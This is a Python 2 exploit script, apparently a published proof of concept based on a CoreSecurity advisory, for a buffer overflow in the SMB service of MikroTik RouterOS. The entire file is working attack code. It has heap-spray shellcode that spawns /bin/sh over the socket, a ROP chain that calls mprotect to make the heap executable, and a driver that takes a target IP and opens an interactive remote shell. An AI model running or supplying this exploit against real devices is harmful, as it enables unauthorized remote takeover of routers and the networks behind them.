#!/usr/bin/env python

# Original implementation of CoreSecurity
# https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow
 
import socket
import struct
import sys
import telnetlib
 
NETBIOS_SESSION_MESSAGE = "\x00"
NETBIOS_SESSION_REQUEST = "\x81"
NETBIOS_SESSION_FLAGS = "\x00"
 
# trick from <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">http://shell-storm.org/shellcode/files/shellcode-881.php</a>
# will place the socket file descriptor in eax
find_sock_fd = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48"
 
# dup stdin-stdout-stderr so we can reuse the existing connection
dup_fds = "\x89\xc3\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9"
 
# execve - cannot pass the 2nd arg as NULL or busybox will complain
execve_bin_sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
# build shellcode
shellcode = find_sock_fd + dup_fds + execve_bin_sh
 
# rop to mprotect and make the heap executable
# the heap base is not being subject to ASLR for whatever reason, so let's take advantage of it
p = lambda x : struct.pack('I', x)
 
rop = ""
rop += p(0x0804c39d) # 0x0804c39d: pop ebx; pop ebp; ret; 
rop += p(0x08072000) # ebx -> heap base
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x080664f5) # 0x080664f5: pop ecx; adc al, 0xf7; ret; 
rop += p(0x14000)    # ecx -> size for mprotect
rop += p(0x08066f24) # 0x08066f24: pop edx; pop edi; pop ebp; ret; 
rop += p(0x00000007) # edx -> permissions for mprotect -> PROT_READ | PROT_WRITE | PROT_EXEC
rop += p(0xffffffff) # edi -> gibberish
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x0804e30f) # 0x0804e30f: pop ebp; ret; 
rop += p(0x0000007d) # ebp -> mprotect system call
rop += p(0x0804f94a) # 0x0804f94a: xchg eax, ebp; ret; 
rop += p(0xffffe42e) # 0xffffe42e; int 0x80; pop ebp; pop edx; pop ecx; ret - from vdso - not affected by ASLR
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x0)        # edx -> zeroed out
rop += p(0x0)        # ecx -> zeroed out
rop += p(0x0804e30f) # 0x0804e30f: pop ebp; ret; 
rop += p(0x08075802) # ebp -> somewhere on the heap that will (always?) contain user controlled data
rop += p(0x0804f94a) # 0x0804f94a: xchg eax, ebp; ret;
rop += p(0x0804e153) # jmp eax; - jump to our shellcode on the heap
 
offset_to_regs = 83
 
# we do not really care about the initial register values other than overwriting the saved ret address
ebx = p(0x45454545)
esi = p(0x45454545)
edi = p(0x45454545)
ebp = p(0x45454545)
eip = p(0x0804886c) # 0x0804886c: ret;
 
payload = "\xff" * offset_to_regs + ebx + esi + edi + ebp + eip + rop
header = struct.pack("!ccH", NETBIOS_SESSION_REQUEST, NETBIOS_SESSION_FLAGS, len(payload))
buf = header + payload
 
def open_connection(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 139))
    return s
 
def store_payload(s):
    print "[+] storing payload on the heap"
    s.send((NETBIOS_SESSION_MESSAGE + "\x00\xeb\x02") * 4000 + "\x90" * 16 + shellcode)
 
def crash_smb(s):
    print "[+] getting code execution"
    s.send(buf)
 
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "%s ip" % sys.argv[0]
        sys.exit(1)
 
    s = open_connection(sys.argv[1])
    store_payload(s)
 
    # the server closes the first connection, so we need to open another one
    t = telnetlib.Telnet()
    t.sock = open_connection(sys.argv[1])
    crash_smb(t.sock)
    print "[+] got shell?"
    t.interact()